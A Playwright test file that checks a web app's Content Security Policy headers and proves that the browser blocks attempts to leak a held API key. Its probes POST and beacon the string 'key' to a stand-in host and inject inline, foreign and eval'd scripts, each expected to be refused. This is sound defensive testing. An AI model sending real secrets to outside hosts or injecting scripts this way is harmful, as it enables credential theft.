import { expect, test, type Page } from "@playwright/test";

import { mockLeagueMembersEnvelope } from "../src/fixtures/league";
import { EXAMPLE_CLAIM } from "./identity";
import { installLeagueMocks } from "./leagueMocks";

// ADR 0017 step 3: a member's model key is held in the tab, so the page runs only the site's
// own scripts and sends only to the hosts its policy names. The preview sends the policy the
// build ships (vite/sitePolicy.ts). The refusals here are made on purpose, on addresses that
// carry `csp-probe`, which e2e/cspReport.teardown.ts leaves out of the run's own count.

const API = process.env.VITE_ADVICE_API_ORIGIN?.trim().replace(/\/+$/, "") ?? "";
const LEAGUE = mockLeagueMembersEnvelope.payload.league_id;
const MEMBER = `/league/${LEAGUE}/members/${EXAMPLE_CLAIM.entryId}`;
const PROBE_HOST = "https://csp-probe.invalid";
const CORS = { "access-control-allow-origin": "*" };

/** A directive's sources, without the preview's 'report-sample', which allows nothing. */
function directive(policy: string, name: string): string[] {
  const found = policy
    .split(";")
    .map((part) => part.trim().split(/\s+/))
    .find(([first]) => first === name);
  return found === undefined ? [] : found.slice(1).filter((source) => source !== "'report-sample'");
}

/** Every refusal the page reports from here on, as `directive blocked-address`. */
async function watchRefusals(page: Page): Promise<() => Promise<string[]>> {
  await page.addInitScript(() => {
    const seen: string[] = [];
    (window as unknown as { __cspRefusals: string[] }).__cspRefusals = seen;
    document.addEventListener("securitypolicyviolation", (event) => {
      seen.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
  });
  return () =>
    page.evaluate(() => [...(window as unknown as { __cspRefusals: string[] }).__cspRefusals]);
}

test("every kind of response carries the policy and the other site-wide headers", async ({
  request,
}) => {
  const shell = await request.get("/");
  const script = /src="(\/assets\/index-[^"]+\.js)"/.exec(await shell.text())?.[1];
  expect(script).toBeDefined();
  for (const address of [
    "/",
    `${MEMBER}/llmopt`,
    script!,
    "/sw.js",
    "/data/leagues.json",
    "/assets/csp-probe-missing.js",
  ]) {
    const response = await request.get(address);
    const headers = response.headers();
    const policy = headers["content-security-policy"] ?? "";
    expect(directive(policy, "default-src"), address).toEqual(["'self'"]);
    expect(directive(policy, "script-src"), address).toEqual([
      "'self'",
      "'wasm-unsafe-eval'",
      "https://static.cloudflareinsights.com",
    ]);
    expect(directive(policy, "object-src"), address).toEqual(["'none'"]);
    expect(directive(policy, "base-uri"), address).toEqual(["'none'"]);
    expect(directive(policy, "frame-ancestors"), address).toEqual(["'none'"]);
    const connect = directive(policy, "connect-src");
    expect(connect[0], address).toBe("'self'");
    if (API !== "") expect(connect[1], address).toBe(API);
    expect(connect, address).toContain("https://api.anthropic.com");
    expect(connect, address).not.toContain("{advice-api-origin}");
    expect(headers["x-content-type-options"], address).toBe("nosniff");
    expect(headers["referrer-policy"], address).toBe("strict-origin-when-cross-origin");
    expect(headers["permissions-policy"], address).toContain("camera=()");
  }
});

test("a request to a host the policy does not name never leaves the page", async ({ page }) => {
  let probeReached = 0;
  await page.route(`${PROBE_HOST}/**`, (route) => {
    probeReached += 1;
    return route.fulfill({ body: "{}", headers: CORS });
  });
  await page.route("https://api.openai.com/**", (route) =>
    route.fulfill({ body: "{}", headers: CORS }),
  );
  const refusals = await watchRefusals(page);
  await page.goto("/privacy?csp-probe=1");
  await expect(page.getByRole("main")).toBeVisible();

  const outcomes = await page.evaluate(async (probe) => {
    async function send(address: string): Promise<string> {
      try {
        await fetch(address, { method: "POST", body: "key" });
        return "sent";
      } catch {
        return "refused";
      }
    }
    return {
      probe: await send(`${probe}/collect`),
      provider: await send("https://api.openai.com/v1/models"),
      // A browser answers true and then refuses the beacon itself, so the report tells.
      queued: navigator.sendBeacon(`${probe}/beacon`, "key"),
    };
  }, PROBE_HOST);

  expect(outcomes).toMatchObject({ probe: "refused", provider: "sent" });
  await expect
    .poll(refusals)
    .toEqual(
      expect.arrayContaining([
        `connect-src ${PROBE_HOST}/collect`,
        `connect-src ${PROBE_HOST}/beacon`,
      ]),
    );
  expect(probeReached).toBe(0);
});

test("a script that is not the site's own does not run", async ({ page }) => {
  let beaconServed = 0;
  // A script from a host the policy does not name, served here so only the policy stops it.
  await page.route("https://cdn.example.net/**", (route) => {
    beaconServed += 1;
    return route.fulfill({
      body: "window.__beaconRan = true;",
      contentType: "text/javascript",
      headers: CORS,
    });
  });
  const refusals = await watchRefusals(page);
  await page.goto("/privacy?csp-probe=1");
  await expect(page.getByRole("main")).toBeVisible();

  const ran = await page.evaluate(async () => {
    const flags = window as unknown as Record<string, unknown>;
    const inline = document.createElement("script");
    inline.textContent = "window.__inlineRan = true;";
    document.head.append(inline);
    const foreign = document.createElement("script");
    foreign.src = "https://cdn.example.net/beacon.min.js?csp-probe=1";
    const settled = new Promise((resolve) => {
      foreign.onload = resolve;
      foreign.onerror = resolve;
    });
    document.head.append(foreign);
    await settled;
    let evaluated = false;
    try {
      // A string made into code is refused like eval itself.
      evaluated = (new Function("return true") as () => boolean)();
    } catch {
      evaluated = false;
    }
    return {
      inline: flags.__inlineRan === true,
      foreign: flags.__beaconRan === true,
      evaluated,
    };
  });

  expect(ran).toEqual({ inline: false, foreign: false, evaluated: false });
  expect(beaconServed).toBe(0);
  await expect
    .poll(refusals)
    .toEqual(
      expect.arrayContaining([
        "script-src-elem inline",
        expect.stringMatching(/^script-src-elem https:\/\/cdn\.example\.net/),
        "script-src eval",
      ]),
    );
});

test("each page opens under the policy without a refusal", async ({ page }) => {
  await installLeagueMocks(page);
  const refusals = await watchRefusals(page);
  for (const address of [
    "/fixtures",
    "/privacy",
    "/contribute",
    `/league/${LEAGUE}`,
    `/league/${LEAGUE}/members`,
    MEMBER,
    `${MEMBER}/history`,
    `${MEMBER}/vs`,
    `${MEMBER}/live`,
    `${MEMBER}/llmopt`,
    `${MEMBER}/reminder`,
  ]) {
    await page.goto(address);
    await expect(page.getByRole("main"), address).toBeVisible();
    await page.waitForLoadState("networkidle");
    expect(await refusals(), address).toEqual([]);
  }
});
